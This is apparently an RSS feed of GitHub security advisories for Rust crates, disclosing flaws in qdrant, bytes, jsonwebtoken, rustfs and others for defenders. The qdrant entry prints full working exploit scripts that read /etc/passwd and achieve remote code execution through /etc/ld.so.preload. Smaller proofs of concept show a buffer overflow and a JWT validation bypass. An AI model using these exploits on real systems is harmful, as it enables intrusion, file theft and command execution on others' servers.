<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/rust.rss</id>
    <title>Security Advisory for Rust crates</title>
    <updated>2026-02-06T12:05:30.286Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
    <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[qdrant] qdrant has arbitrary file write via `/logger` endpoint]]></title>
        <id>https://github.com/advisories/GHSA-f632-vm87-2m2f</id>
        <link href="https://github.com/advisories/GHSA-f632-vm87-2m2f"/>
        <updated>2026-02-05T21:22:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>It is possible to append to arbitrary files via /logger endpoint. Minimal privileges are required (read-only access). Tested on Qdrant 1.15.5</p>
<h3 id="details">Details</h3>
<p><code>POST /logger</code>
(<a href="https://github.com/qdrant/qdrant/blob/48203e414e4e7f639a6d394fb6e4df695f808e51/src/actix/api/service_api.rs#L195">Source code link</a>)
endpoint accepts an attacker-controlled <code>on_disk.log_file</code> path.</p>
<p>There are no authorization checks (but authentication check is present).</p>
<p>This can be exploited in the following way: if configuration directory is writable and <code>config/local.yaml</code> does not exist, set log path to <code>config/local.yaml</code> and send a request with a log injection payload. The<code>PATCH /collections</code> endpoint was used with an invalid collection name to inject valid yaml.</p>
<p>After running the PoC, the content of <code>config/local.yaml</code> will be:</p>
<pre><code class="language-yaml">2025-11-11T23:52:22.054804Z  INFO actix_web::middleware::logger: 172.18.0.1 "POST /logger HTTP/1.1" 200 57 "-" "python-requests/2.32.5" 0.009422
2025-11-11T23:52:22.056962Z  INFO storage::content_manager::toc::collection_meta_ops: Updating collection hui
service:
    static_content_dir: ..

2025-11-11T23:52:22.057530Z  INFO actix_web::middleware::logger: 172.18.0.1 "PATCH /collections/hui%0Aservice:%0A%20%20static_content_dir:%20..%0A HTTP/1.1" 404 113 "-" "python-requests/2.32.5" 0.001391
</code></pre>
<p>Some junk log lines are present, but they don't matter as this is still valid yaml.</p>
<p>After that, if qdrant is restarted (via legitimate means or by a OOM/crash), then <code>local.yaml</code> config will have higher priority and <code>service.static_content_dir</code> will be set to <code>..</code>. In a container environment, this allows one to read all files via the web UI path.</p>
<p>Also overriding config file may let the attacker raise its privileges with a custom master key (remember that lowest privileges are required to access the vulnerable endpoint).</p>
<p>Relevant requests:</p>
<ol>
<li>Enable on-disk logging to the config file:</li>
</ol>
<pre><code class="language-bash">curl -sS -X POST "http://localhost:6333/logger" \
  -H "Content-Type: application/json" \
  -d '{
    "log_level":"INFO",
    "on_disk":{
      "enabled":true,
      "format":"text",
      "log_level":"INFO",
      "buffer_size_bytes":1,
      "log_file":"config/local.yaml"
    }
  }'
</code></pre>
<ol start="2">
<li>Inject YAML via a request that logs newlines (URL-encoded):</li>
</ol>
<pre><code class="language-bash">curl -sS -X PATCH "http://localhost:6333/collections/hui%0aservice:%0a%20%20static_content_dir:%20..%0a" \
  -H "Content-Type: application/json" \
  -d '{}'
</code></pre>
<h3 id="full-reproduction-instructions">Full reproduction instructions</h3>
<ol>
<li>Start Qdrant with a writable configuration directory:</li>
</ol>
<pre><code class="language-sh">sudo docker run -p 6333:6333 --name qdrant-poc -d qdrant/qdrant:v1.15.5
</code></pre>
<ol start="2">
<li>Run the exploit:</li>
</ol>
<pre><code class="language-sh">% python3 exploit.py --url http://localhost:6333
[+] Logger configured
[+] Log injection successful
[+] Logger disabled
Restart Qdrant cluster and press Enter to continue...
</code></pre>
<ol start="3">
<li>Restart the container:</li>
</ol>
<pre><code class="language-sh">sudo docker restart qdrant-poc
</code></pre>
<ol start="4">
<li>Resume the exploit:</li>
</ol>
<pre><code class="language-sh">&lt;press Enter&gt;
[+] Passwd file retrieved
--------------------------------
...
--------------------------------
[+] Config file retrieved
--------------------------------
...
</code></pre>
<h2 id="mitigation">Mitigation</h2>
<ol>
<li>Limit usage of <code>/logger</code> endpoint to users with management privileges only (or better disable it completely).</li>
<li>Restrict the path of the log file to a dedicated logs directory.</li>
</ol>
<p>This vulnerability does not affect Qdrant cloud as the configuration directory is not writable.</p>
<h2 id="exploit-code">Exploit code</h2>
<h3 id="exploit_privescpy"><code>exploit_privesc.py</code></h3>
<pre><code class="language-python">import requests
import sys
import argparse

parser = argparse.ArgumentParser(description="Exploit script for posting to Qdrant API")
parser.add_argument("--url", required=False, help="Target URL for API", default="http://localhost:6333")
parser.add_argument("--api-key", required=False, help="API key")

args = parser.parse_args()

url = args.url

headers = {}
if args.api_key:
    headers["api-key"] = args.api_key

s = requests.Session()

s.headers.update(headers)

res = s.post(
    f"{url}/logger",
    json={
        "log_level": "INFO",
        "on_disk": {
            "enabled": True,
            "format": "text",
            "log_level": "INFO",
            "buffer_size_bytes": 1,
            "log_file": "config/local.yaml",
        },
    },
)
res.raise_for_status()
print("[+] Logger configured")


res = s.patch(
    f"{url}/collections/%0aservice:%0a%20%20static_content_dir:%20..%0a",
    json={},
)
error = res.json()["status"]["error"]

if "doesn't exist!" in error:
    print("[+] Log injection successful")
else:
    print(f"[-] Error: {error}")
    sys.exit(1)

res = s.post(
    f"{url}/logger",
    json={
        "on_disk": {
            "enabled": False,
        },
    },
)
res.raise_for_status()
print("[+] Logger disabled")

input("Restart Qdrant cluster and press Enter to continue...")

res = s.get(f"{url}/dashboard/etc/passwd")
res.raise_for_status()
print("[+] Passwd file retrieved")
print("--------------------------------")
print(res.text)
print("--------------------------------")

res = s.get(f"{url}/dashboard/qdrant/config/config.yaml")
res.raise_for_status()
print("[+] Config file retrieved")
print("--------------------------------")
print(res.text)
print("--------------------------------")
</code></pre>
<h2 id="exploit_rcepy"><code>exploit_rce.py</code></h2>
<pre><code class="language-python">import requests
import argparse
import tempfile
import os

TEST_COLLECTION_NAME = "COLTEST"


parser = argparse.ArgumentParser(description="Exploit script for posting to Qdrant API")
parser.add_argument("--url", required=False, help="Target URL for API", default="http://localhost:6333")
parser.add_argument("--api-key", required=False, help="API key")
parser.add_argument("--cmd", default="touch /tmp/touched_by_rce")
parser.add_argument("--lib", default="")

args = parser.parse_args()


assert "'" not in args.cmd, "Command must not contain single quotes"
so_code = """
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

__attribute__((constructor))
void init() {
    unlink("/etc/ld.so.preload");
    system("/bin/bash -c 'XXXXXXXX'");
}
""".replace('XXXXXXXX', args.cmd)

with tempfile.TemporaryDirectory() as tmpdir:
    with open(f"{tmpdir}/cmd_code.c", "w") as f:
        f.write(so_code)
    os.system(f'gcc -shared -fPIC -o {tmpdir}/cmd.so {tmpdir}/cmd_code.c')
    cmd_so = open(f'{tmpdir}/cmd.so', "rb").read()

url = args.url

headers = {}
if args.api_key:
    headers["api-key"] = args.api_key

s = requests.Session()

s.headers.update(headers)

res = s.post(
    f"{url}/logger",
    json={
        "log_level": "INFO",
        "on_disk": {
            "enabled": True,
            "format": "text",
            "log_level": "INFO",
            "buffer_size_bytes": 1,
            "log_file": "/etc/ld.so.preload",
        },
    },
)
res.raise_for_status()
print("[+] Logger configured")

res = s.get(
    f"{url}/:/qdrant/snapshots/{TEST_COLLECTION_NAME}/hui.so",
)

print("[+] Log injected")


res = s.post(
    f"{url}/logger",
    json={
        "on_disk": {
            "enabled": False,
        },
    },
)
res.raise_for_status()
print("[+] Logger disabled")


rsp = s.post(f"{args.url}/collections/{TEST_COLLECTION_NAME}/snapshots/upload", files={"snapshot": ("hui.so", cmd_so, "application/octet-stream")})

print(rsp.text)
# trigger the stacktace endpoint which will run execute `/qdrant/qdrant --stacktrace`

input("Press Enter to continue...")
rsp = s.get(f"{args.url}/stacktrace")
rsp.raise_for_status()
</code></pre>
<h3 id="impact">Impact</h3>
<p>Remote code execution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/qdrant/qdrant/security/advisories/GHSA-f632-vm87-2m2f">https://github.com/qdrant/qdrant/security/advisories/GHSA-f632-vm87-2m2f</a></li>
<li><a href="https://github.com/qdrant/qdrant/blob/48203e414e4e7f639a6d394fb6e4df695f808e51/src/actix/api/service_api.rs#L195">https://github.com/qdrant/qdrant/blob/48203e414e4e7f639a6d394fb6e4df695f808e51/src/actix/api/service_api.rs#L195</a></li>
<li><a href="https://github.com/advisories/GHSA-f632-vm87-2m2f">https://github.com/advisories/GHSA-f632-vm87-2m2f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f632-vm87-2m2f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-02-05T21:22:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[time] time vulnerable to stack exhaustion Denial of Service attack]]></title>
        <id>https://github.com/advisories/GHSA-r6v5-fh4h-64xc</id>
        <link href="https://github.com/advisories/GHSA-r6v5-fh4h-64xc"/>
        <updated>2026-02-05T19:01:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When user-provided input is provided to any type that parses with the RFC 2822 format, a Denial of Service attack via stack exhaustion is possible. The attack relies on formally deprecated and rarely-used features that are part of the RFC 2822 format used in a malicious manner. Ordinary, non-malicious input will never encounter this scenario.</p>
<h3 id="patches">Patches</h3>
<p>A limit to the depth of recursion was added in v0.3.47. From this version, an error will be returned rather than exhausting the stack.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Limiting the length of user input is the simplest way to avoid stack exhaustion, as the amount of the stack consumed would be at most a factor of the length of the input.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/time-rs/time/security/advisories/GHSA-r6v5-fh4h-64xc">https://github.com/time-rs/time/security/advisories/GHSA-r6v5-fh4h-64xc</a></li>
<li><a href="https://github.com/time-rs/time/commit/f6206b050fd54817d8872834b4d61f605570e89b">https://github.com/time-rs/time/commit/f6206b050fd54817d8872834b4d61f605570e89b</a></li>
<li><a href="https://github.com/advisories/GHSA-r6v5-fh4h-64xc">https://github.com/advisories/GHSA-r6v5-fh4h-64xc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r6v5-fh4h-64xc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-02-05T17:57:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[git2] git2 has potential undefined behavior when dereferencing Buf struct ]]></title>
        <id>https://github.com/advisories/GHSA-j39j-6gw9-jw6h</id>
        <link href="https://github.com/advisories/GHSA-j39j-6gw9-jw6h"/>
        <updated>2026-02-04T20:36:07.000Z</updated>
        <content type="html"><![CDATA[<p>If the Buf struct is dereferenced immediately after calling new() or default() on the Buf struct, a null pointer is passed to the unsafe function slice::from_raw_parts. According to the safety section documentation of the function, data must be non-null and aligned even for zero-length slices or slices of ZSTs. Thus, passing a null pointer will lead to undefined behavior.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rust-lang/git2-rs/issues/1211">https://github.com/rust-lang/git2-rs/issues/1211</a></li>
<li><a href="https://github.com/rust-lang/git2-rs/pull/1213">https://github.com/rust-lang/git2-rs/pull/1213</a></li>
<li><a href="https://github.com/rust-lang/git2-rs/commit/9e160f15bd056f82143109bb330573381e5de719">https://github.com/rust-lang/git2-rs/commit/9e160f15bd056f82143109bb330573381e5de719</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0008.html">https://rustsec.org/advisories/RUSTSEC-2026-0008.html</a></li>
<li><a href="https://github.com/advisories/GHSA-j39j-6gw9-jw6h">https://github.com/advisories/GHSA-j39j-6gw9-jw6h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j39j-6gw9-jw6h</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-02-04T20:36:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openmls] openmls has improper tag validation]]></title>
        <id>https://github.com/advisories/GHSA-8x3w-qj7j-gqhf</id>
        <link href="https://github.com/advisories/GHSA-8x3w-qj7j-gqhf"/>
        <updated>2026-02-04T20:24:04.000Z</updated>
        <content type="html"><![CDATA[<p>Membership and confirmation tags may not be checked correctly due to a missing length check. Any tag that is shorter than the expected tag, but matches up to its length, as well as any empty tag is considered valid.</p>
<h3 id="impact">Impact</h3>
<p>The vulnerability affects a secondary authentication guarantee that MLS provides in certain scenarios. The primary authentication guarantee for all messages comes from the signature on MLS messages. This guarantee is <em>not</em> affected by the vulnerability.<br>The secondary authentication attests to the group membership of the message author. For MLS private messages, it is implied in the AEAD. For MLS public messages, it is expressed as the ‘membership tag’, a MAC whose key is derived from the private group state only known to group members.</p>
<p>In addition, for public Commit messages, the ‘confirmation tag’ works in a similar manner. Its purpose is to help members who processed the Commit message to ascertain that they now have the same view on the group as the creator of the Commit message for both the private and public group state. </p>
<p>The vulnerability lets an attacker create MLS messages with a truncated tag that are considered valid nonetheless.</p>
<p>The vulnerability does not affect the primary authentication guarantees of MLS, but breaks post-compromise security (PCS) of the MLS authentication guarantees. As a consequence, an adversary that has compromised a member’s signature key can create valid-looking proposals even after the affected member has successfully updated its key material. However, this is only possible in applications where the following conditions are met:</p>
<ul>
<li>The application uses public MLS messages (i.e. it has not restricted the wire format type to private MLS messages only), and  </li>
<li>the application supports proposals by reference (aka standalone proposals).</li>
</ul>
<p>Note that, in deployments that allow external Commits, an attacker in possession of a member’s signature key can insert itself into the group without having to forge a membership tag.</p>
<h3 id="patches">Patches</h3>
<p>There are two ways to mitigate the issue:</p>
<ul>
<li>Upgrade to openmls v0.7.2: This minor release includes a fix for the issue and bumps the libcrux dependencies. This release does not contain any breaking changes from v0.7.1.  </li>
<li>Upgrade to openmls v0.8.0: This release contains the fix, as well as other improvements. The list of changes is in <a href="https://github.com/openmls/openmls/blob/main/CHANGELOG.md">CHANGELOG.md</a>. Some of the changes are breaking API changes.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openmls/openmls/security/advisories/GHSA-8x3w-qj7j-gqhf">https://github.com/openmls/openmls/security/advisories/GHSA-8x3w-qj7j-gqhf</a></li>
<li><a href="https://github.com/openmls/openmls/commit/91ec049ffc2fa3766110223aa2aabe0303837af8">https://github.com/openmls/openmls/commit/91ec049ffc2fa3766110223aa2aabe0303837af8</a></li>
<li><a href="https://github.com/openmls/openmls/releases/tag/openmls-v0.7.2">https://github.com/openmls/openmls/releases/tag/openmls-v0.7.2</a></li>
<li><a href="https://github.com/advisories/GHSA-8x3w-qj7j-gqhf">https://github.com/advisories/GHSA-8x3w-qj7j-gqhf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8x3w-qj7j-gqhf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-02-04T20:24:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bytes] bytes has integer overflow in BytesMut::reserve]]></title>
        <id>https://github.com/advisories/GHSA-434x-w66g-qw3r</id>
        <link href="https://github.com/advisories/GHSA-434x-w66g-qw3r"/>
        <updated>2026-02-05T00:37:18.000Z</updated>
        <content type="html"><![CDATA[<h1 id="details">Details</h1>
<p>In the unique reclaim path of <code>BytesMut::reserve</code>, the condition</p>
<pre><code class="language-rs">if v_capacity &gt;= new_cap + offset
</code></pre>
<p>uses an unchecked addition. When <code>new_cap + offset</code> overflows <code>usize</code> in release builds, this condition may incorrectly pass, causing <code>self.cap</code> to be set to a value that exceeds the actual allocated capacity. Subsequent APIs such as <code>spare_capacity_mut()</code> then trust this corrupted <code>cap</code> value and may create out-of-bounds slices, leading to UB.</p>
<p>This behavior is observable in release builds (integer overflow wraps), whereas debug builds panic due to overflow checks.</p>
<h2 id="poc">PoC</h2>
<pre><code class="language-rs">use bytes::*;

fn main() {
    let mut a = BytesMut::from(&amp;b"hello world"[..]);
    let mut b = a.split_off(5);

    // Ensure b becomes the unique owner of the backing storage
    drop(a);

    // Trigger overflow in new_cap + offset inside reserve
    b.reserve(usize::MAX - 6);

    // This call relies on the corrupted cap and may cause UB &amp; HBO
    b.put_u8(b'h');
}
</code></pre>
<h1 id="workarounds">Workarounds</h1>
<p>Users of <code>BytesMut::reserve</code> are only affected if integer overflow checks are configured to wrap. When integer overflow is configured to panic, this issue does not apply.</p>
<p>This vulnerability is also known as <a href="https://rustsec.org/advisories/RUSTSEC-2026-0007.html">RUSTSEC-2026-0007</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tokio-rs/bytes/security/advisories/GHSA-434x-w66g-qw3r">https://github.com/tokio-rs/bytes/security/advisories/GHSA-434x-w66g-qw3r</a></li>
<li><a href="https://github.com/tokio-rs/bytes/commit/d0293b0e35838123c51ca5dfdf468ecafee4398f">https://github.com/tokio-rs/bytes/commit/d0293b0e35838123c51ca5dfdf468ecafee4398f</a></li>
<li><a href="https://github.com/tokio-rs/bytes/releases/tag/v1.11.1">https://github.com/tokio-rs/bytes/releases/tag/v1.11.1</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0007.html">https://rustsec.org/advisories/RUSTSEC-2026-0007.html</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25541">https://nvd.nist.gov/vuln/detail/CVE-2026-25541</a></li>
<li><a href="https://github.com/advisories/GHSA-434x-w66g-qw3r">https://github.com/advisories/GHSA-434x-w66g-qw3r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-434x-w66g-qw3r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-02-03T19:17:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jsonwebtoken] jsonwebtoken has Type Confusion that leads to potential authorization bypass]]></title>
        <id>https://github.com/advisories/GHSA-h395-gr6q-cpjc</id>
        <link href="https://github.com/advisories/GHSA-h395-gr6q-cpjc"/>
        <updated>2026-02-05T00:35:15.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary:</h2>
<p>It has been discovered that there is a Type Confusion vulnerability in jsonwebtoken, specifically, in its claim validation logic.</p>
<p>When a standard claim (such as nbf or exp) is provided with an incorrect JSON type (Like a String instead of a Number), the library’s internal parsing mechanism marks the claim as “FailedToParse”. Crucially, the validation logic treats this “FailedToParse” state identically to “NotPresent”.</p>
<p>This means that if a check is enabled (like: validate_nbf = true), but the claim is not explicitly marked as required in required_spec_claims, the library will skip the validation check entirely for the malformed claim, treating it as if it were not there. This allows attackers to bypass critical time-based security restrictions (like “Not Before” checks) and commit potential authentication and authorization bypasses.</p>
<h2 id="details">Details:</h2>
<p>The vulnerability stems from the interaction between the TryParse enum and the validate function in <a href="https://github.com/Keats/jsonwebtoken/blob/master/src/validation.rs">src/validation.rs</a>.</p>
<ol>
<li>The TryParse Enum: The library uses a custom TryParse enum to handle claim deserialization:</li>
</ol>
<pre><code>enum TryParse&lt;T&gt; {
    Parsed(T),
    FailedToParse, // Set when deserialization fails (e.g. type mismatch)
    NotPresent,
}
</code></pre>
<p>If a user sends {“nbf”: “99999999999”} (legacy/string format), serde fails to parse it as u64, and it results in TryParse::FailedToParse.</p>
<ol>
<li>The Validation Logic Flaw (src/validation.rs): In Validation::validate, the code checks for exp and nbf
like this:</li>
</ol>
<pre><code>// L288-291
if matches!(claims.nbf, TryParse::Parsed(nbf) if options.validate_nbf &amp;&amp; nbf &gt; now + options.leeway) {
    return Err(new_error(ErrorKind::ImmatureSignature));
}
</code></pre>
<p>This matches! macro explicitly looks for TryParse::Parsed(nbf).</p>
<p> • If claims.nbf is FailedToParse, the match returns false.
 • The if block is skipped.
 • No error is returned.</p>
<ol>
<li>The “Required Claims” Gap: The only fallback mechanism is the “Required Claims” check:</li>
</ol>
<pre><code>// Lines 259-267
for required_claim in &amp;options.required_spec_claims {
    let present = match required_claim.as_str() {
        "nbf" =&gt; matches!(claims.nbf, TryParse::Parsed(_)),
        // ...
    };
    if !present { return Err(...); }
}
</code></pre>
<p>If “nbf” IS in required_spec_claims, FailedToParse will fail the matches!(..., Parsed(_)) check, causing the present to be false, and correctly returning an error.</p>
<p>However, widely accepted usage patterns often enable validation flags (validate_nbf = true) without adding the claim to the required list, assuming that enabling validation implicitly requires the claim’s validity if it appears in the token. jsonwebtoken seems to violate this assumption.</p>
<p>Environment:</p>
<p> • Version: jsonwebtoken 10.2.0
 • Rust Version: rustc 1.90.0
 • Cargo Version: cargo 1.90.0
 • OS: MacOS Tahoe 26.2</p>
<p>POC:</p>
<p>For demonstrating, Here is this simple rust code that demonstrates the bypass. It attempts to validate a token with a string nbf claiming to be valid only in the far future.</p>
<p>create a new project:</p>
<pre><code>cargo new nbf_poc; cd nbf_poc
</code></pre>
<p>add required dependencies:</p>
<pre><code>cargo add serde --features derive
cargo add jsonwebtoken --features rust_crypto
cargo add serde_json
</code></pre>
<p>replace the code in src/main.rs with this:</p>
<pre><code>use jsonwebtoken::{decode, Validation, Algorithm, DecodingKey, Header, EncodingKey, encode};
use serde::{Deserialize, Serialize};

#[derive(Debug, Serialize, Deserialize)]
struct Claims {
    sub: String,
    nbf: String, // Attacker sends nbf as a String
    exp: usize,
}
fn main() {
    let key: &amp;[u8; 24] = b"RedMouseOverTheSkyIsBlue";

    // nbf is a String "99999999999" (Far future)
    // Real nbf should be a Number.
    let my_claims: Claims = Claims {
        sub: "krishna".to_string(),
        nbf: "99999999999".to_string(), 
        exp: 10000000000, 
    };

    let token: String = encode(&amp;Header::default(), &amp;my_claims, &amp;EncodingKey::from_secret(key)).unwrap();
    println!("Forged Token: {}", token);

    // 2. Configure Validation
    let mut validation: Validation = Validation::new(Algorithm::HS256);
    validation.validate_nbf = true; // Enable NBF check

    // We do NOT add "nbf" to required_spec_claims (default behavior)

    // We decode to serde_json::Value to avoid strict type errors in our struct definition hiding the library bug.
    // The library sees the raw JSON with string "nbf".
    let result: Result&lt;jsonwebtoken::TokenData&lt;serde_json::Value&gt;, jsonwebtoken::errors::Error&gt; = decode::&lt;serde_json::Value&gt;(
        &amp;token, 
        &amp;DecodingKey::from_secret(key), 
        &amp;validation
    );

    match result {
        Ok(_) =&gt; println!("Token was accepted despite malformed far-future 'nbf'!"),
        Err(e) =&gt; println!("Token rejected. Error: {:?}", e),
    }
}
</code></pre>
<p>run cargo run</p>
<p>expected behaviour:</p>
<pre><code>Forged Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJrcmlzaG5hIiwibmJmIjoiOTk5OTk5OTk5OTkiLCJleHAiOjEwMDAwMDAwMDAwfQ.Fm3kZIqMwqIA6sEA1w52UOMqqnu4hlO3FQStFmbaOwk
</code></pre>
<p>Token was accepted despite malformed far-future 'nbf'!
Impact:</p>
<p>If an application uses jsonwebtoken nbf (Not Before) to schedule access for the future (like “Access granted starting tomorrow”).</p>
<p>By sending nbf as a string, an attacker can bypass this restriction and access the resource immediately.</p>
<p>and for the exp claim (this is unlikely but still adding), If a developer sets validate_exp = true but manually handles claim presence (removing exp from required_spec_claims), an attacker can send a string exp (e.g., “never”) and bypass expiration checks entirely. The token becomes valid forever.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Keats/jsonwebtoken/security/advisories/GHSA-h395-gr6q-cpjc">https://github.com/Keats/jsonwebtoken/security/advisories/GHSA-h395-gr6q-cpjc</a></li>
<li><a href="https://github.com/Keats/jsonwebtoken/commit/abbc3076742c4161347bc6b8bf4aa5eb86e1dc01">https://github.com/Keats/jsonwebtoken/commit/abbc3076742c4161347bc6b8bf4aa5eb86e1dc01</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25537">https://nvd.nist.gov/vuln/detail/CVE-2026-25537</a></li>
<li><a href="https://github.com/advisories/GHSA-h395-gr6q-cpjc">https://github.com/advisories/GHSA-h395-gr6q-cpjc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h395-gr6q-cpjc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-02-03T18:47:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rustfs] RustFS Logs Sensitive Credentials in Plaintext]]></title>
        <id>https://github.com/advisories/GHSA-r54g-49rx-98cr</id>
        <link href="https://github.com/advisories/GHSA-r54g-49rx-98cr"/>
        <updated>2026-02-03T19:44:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>RustFS logs sensitive credential material (access key, secret key, session token) to application logs at INFO level. This results in credentials being recorded in plaintext in log output, which may be accessible to internal or external log consumers and could lead to compromise of sensitive credentials. This vulnerability is classified as an information disclosure issue (CWE-532).</p>
<h3 id="details">Details</h3>
<p>The server writes newly generated STS credential information including the access key, secret key, and session token to logs. The following excerpts from application logs demonstrate this:</p>
<pre><code>[2026-01-17 09:13:23.127767 +11:00] INFO [rustfs::admin::handlers::sts] [rustfs/src/admin/handlers/sts.rs:138] [rustfs-worker:ThreadId(4)] AssumeRole get new_cred Credentials { access_key: "5UGH6TM44IPA81AH1WZE", secret_key: "3BQ-KnO_iB5ovmd5SU4wIK6sFfaPTliftvQ_iNLS", session_token: "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJleHAiOjE3Njg2NDQ4MDMsInBhcmVudCI6InJ1c3Rmc2FkbWluIn0.F9ZhARXyU0cB6QoFMElKK5tns_RFQM9WlpMiGVuuDOpOfNrbEKE_9IK1oaJ_yqDsBlK115uYOcQcGohjgUPhOQ", expiration: Some(2026-01-17 10:13:23.0 +00:00:00), status: "on", parent_user: "rustfsadmin", groups: None, claims: None, name: None, description: None }
</code></pre>
<p>By inspecting logs, an attacker or unauthorized internal user with access to logs could retrieve these credentials and use them to authenticate to RustFS services or perform other unauthorized actions.</p>
<h3 id="impact">Impact</h3>
<ul>
<li>Information Exposure: Plaintext authentication credentials appear in log files that may be retained, backed up, or forwarded to centralized logging systems.</li>
<li>Credential Compromise: Access keys, secret keys, and session tokens may be used by unauthorized individuals to authenticate to RustFS services or hijack sessions.</li>
<li>Insider Threat: Even users with limited access who can read logs may gain elevated access if they retrieve credential material.</li>
<li>Compliance Risk: Logging sensitive authentication material may violate organizational policies and industry compliance standards (e.g., PCI-DSS, SOC2, ISO 27001) that forbid exposure of authentication secrets in logs</li>
</ul>
<h3 id="remediation">Remediation</h3>
<ul>
<li>Do not include secrets in log output — redact secret_key, session_token, and similar fields.</li>
<li>Log only safe identifiers such as non-sensitive IDs (e.g., parent_user, trace ID).</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rustfs/rustfs/security/advisories/GHSA-r54g-49rx-98cr">https://github.com/rustfs/rustfs/security/advisories/GHSA-r54g-49rx-98cr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-24762">https://nvd.nist.gov/vuln/detail/CVE-2026-24762</a></li>
<li><a href="https://github.com/advisories/GHSA-r54g-49rx-98cr">https://github.com/advisories/GHSA-r54g-49rx-98cr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r54g-49rx-98cr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-02-03T17:37:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rustfs] RustFS has SourceIp bypass via spoofed X-Forwarded-For/Real-IP headers]]></title>
        <id>https://github.com/advisories/GHSA-fc6g-2gcp-2qrq</id>
        <link href="https://github.com/advisories/GHSA-fc6g-2gcp-2qrq"/>
        <updated>2026-02-03T18:55:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>IP-based access control can be bypassed: get_condition_values trusts client-supplied X-Forwarded-For/X-Real-Ip without verifying a trusted proxy, so any reachable client can spoof aws:SourceIp and satisfy IP-allowlist policies.</p>
<h3 id="details">Details</h3>
<ul>
<li>Vulnerable code: <code>rustfs/src/auth.rs:289-304</code> sets <code>remote_addr</code> from <code>X-Forwarded-For</code>/<code>X-Real-Ip</code>, then inserts <code>SourceIp</code> via
<code>get_source_ip_raw</code>, with no trust boundary or proxy validation:<ul>
<li><code>let remote_addr = header.get("x-forwarded-for").and_then(...).or_else(|| header.get("x-real-ip")...).unwrap_or("127.0.0.1");</code></li>
<li><code>args.insert("SourceIp", vec![get_source_ip_raw(header, remote_addr)]);</code></li>
</ul>
</li>
<li>This value feeds IAM/bucket policy evaluation in <code>rustfs/src/storage/access.rs</code> (authorization path), so any request that forges the header can meet <code>aws:SourceIp</code> conditions.</li>
<li>No authentication is required beyond the request itself; the header is taken at face value even on direct connections.</li>
</ul>
<h3 id="poc">PoC</h3>
<p><a href="https://github.com/user-attachments/files/24038162/rustfs-auth-trusted-ip-header-spoofing-poc.tar.gz">rustfs-auth-trusted-ip-header-spoofing-poc.tar.gz</a></p>
<p>Steps (already included in <code>rustfs-auth-trusted-ip-header-spoofing-poc/</code>):</p>
<ol>
<li>Start RustFS with two local volumes, e.g.:</li>
</ol>
<pre><code>     mkdir -p /tmp/rustfs-data1 /tmp/rustfs-data2
     RUSTFS_ACCESS_KEY=devadmin RUSTFS_SECRET_KEY=devadmin \
       cargo run --bin rustfs -- --address 0.0.0.0:9000 \
